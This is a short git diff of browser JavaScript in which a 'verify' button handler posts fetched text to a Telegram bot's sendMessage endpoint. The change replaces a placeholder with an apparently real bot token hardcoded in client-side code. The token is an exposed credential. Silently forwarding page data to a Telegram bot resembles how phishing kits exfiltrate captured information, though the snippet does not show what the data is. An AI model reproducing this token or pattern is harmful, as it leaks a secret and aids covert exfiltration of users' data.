@@ -18,7 +18,7 @@ document.getElementById("verifyBtn").addEventListener("click", async () => {
     const text = await res.text();
 
     // Optionally send directly to your Telegram Bot (via webhook or backend logic)
-    await fetch(`https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot<8105294009:AAGNS_G7C25H_hO_Tk-p4SbRdlHJ6hyAVYE>/sendMessage`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
